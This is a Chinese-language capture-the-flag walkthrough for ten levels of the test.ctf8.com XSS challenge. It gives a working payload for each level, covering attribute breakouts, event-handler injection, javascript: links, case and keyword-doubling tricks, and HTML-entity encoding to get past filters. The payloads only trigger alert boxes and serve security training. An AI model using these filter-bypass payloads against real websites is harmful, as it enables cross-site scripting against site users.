# test.ctf8
地址 https://test.ctf8.com 
## level1
通过修改url参数，发现页面变化。查看网页源代码。可能是在这个位置直接插入提交的参数。 
url改为
```
http://test.ctf8.com/level1.php?name=<script>alert("1")</script>
```
![level1](/0secure/test.ctf8/level1.png "level1")

## level2
使用
```
<script>alert("1")</script>
```
没有通过，发现该值被插入到了input标签的value属性中
![level2_1](/0secure/test.ctf8/level2_1.png "level2_1")
尝试使用">闭合标签 
```
"><script>alert("1")</script>
```

## level3
使用
```
"><script>alert("1")</script><"
```
![level3_1](/0secure/test.ctf8/level3_1.png "level3_1")
发现在input标签中，无法使用">闭合value属性。所以想到添加一个属性，例如onclick。同时将"双引号修改成'单引号,然后触发onclick事件。使用//来注释掉后面的>。
```
' onclick=alert("1")//
```
![level3_2](/0secure/test.ctf8/level3_2.png "level3_2")

## level4
使用
```
' onclick=alert("1")//
```
![level4_1](/0secure/test.ctf8/level4_1.png "level4_1")
发现value属性未闭合。猜测，在html源代码中，不管写双引号"还是单引号'，最终查看到的网页源代码都是"。所以将'单引号改为"双引号。
```
" onclick=alert("1")//
```
成功添加onclick属性
![level4_2](/0secure/test.ctf8/level4_2.png "level4_2")

## level5
使用
```
" onclick=alert("1")//
```
![level5_1](/0secure/test.ctf8/level5_1.png "level5_1")
发现想要插入的onclick属性变为o_nclick属性。尝试删除掉o。
![level5_2](/0secure/test.ctf8/level5_2.png "level5_2")
逻辑可能为在输入的o后插入_再放回value中。所以尝试使用不带o的a标签 
```
"><a href="javascript:alert('1')">//
```
![level5_3](/0secure/test.ctf8/level5_3.png "level5_3")
成功插入a标签

## level6 
使用
```
"><a href="javascript:alert('1')">//
```
![level6_1](/0secure/test.ctf8/level6_1.png "level6_1")
发现r字母后面被插入_。删除r验证
```
"><a hef="javascript:alert('1')">//
```
![level6_2](/0secure/test.ctf8/level6_2.png "level6_2")
验证成功。尝试通过将R大写来避免插入
```
"><a hRef="javascript:alert('1')">//
```
![level6_3](/0secure/test.ctf8/level6_3.png "level6_3")
成功插入a标签

## level7
使用
```
"><a hRef="javascript:alert('1')">//
```
发现href属性消失,javascript中的script也消失了。
![level7_1](/0secure/test.ctf8/level7_1.png "level7_1")
猜测可能是href和script被替换成了null，使用hrhrefef，即使href被替换了，还能剩下href。
```
"><a hrhrefef="javascrscriptipt:alert('1')">//
```
![level7_2](/0secure/test.ctf8/level7_2.png "level7_2")

## level8
![level8_1](/0secure/test.ctf8/level8_1.png "level8_1")
先输入1，发现输入内容会被插入在href属性里。
![level8_2](/0secure/test.ctf8/level8_2.png "level8_2")
输入javascrscriptipt:alert('1')，发现在r后加入了_下划线，尝试大写输入R绕过也失败。
![level8_3](/0secure/test.ctf8/level8_3.png "level8_3")
将script转化为html实体，绕过过滤 转换工具https://config.net.cn/tools/HtmlEncode.html

## level9
![level9_1](/0secure/test.ctf8/level9_1.png "level9_1")
输入1，发现源代码中提示链接不合法。尝试http//cn.bing.com 
![level9_2](/0secure/test.ctf8/level9_2.png "level9_2")
链接合法。所以此处应该输入网址格式的内容
尝试http://,通过检验，只要输入内容中包含http://即可
![level9_3](/0secure/test.ctf8/level9_3.png "level9_3")
使用
```
http://"> onclick(alert('1'))//
```
发现onclick被加下划线过滤，使用html实体绕过
![level9_4](/0secure/test.ctf8/level9_4.png "level9_4")
```
http://'> &#x006f;&#x006e;&#x0063;&#x006c;&#x0069;&#x0063;&#x006b;(alert('1'))//
```
使用'和"都无法闭合href属性，尝试使用href中加javascript
```
java&#x0073;&#x0063;&#x0072;&#x0069;&#x0070;&#x0074;:alert("http://")
```
![level9_5](/0secure/test.ctf8/level9_5.png "level9_5")
发现双引号被过滤，将双引号换成单引号，通过

## level10
发现源代码表单中有三个input，尝试通过url增加参数，只有t_sort的value改变
![level10_1](/0secure/test.ctf8/level10_1.png "level10_1")
通过type="text"将该输入框调成可见，同时增加onclick属性，通过
```
http://test.ctf8.com/level10.php?t_sort=" type="text" onclick="alert('1')"
```
![level10_2](/0secure/test.ctf8/level10_2.png "level10_2")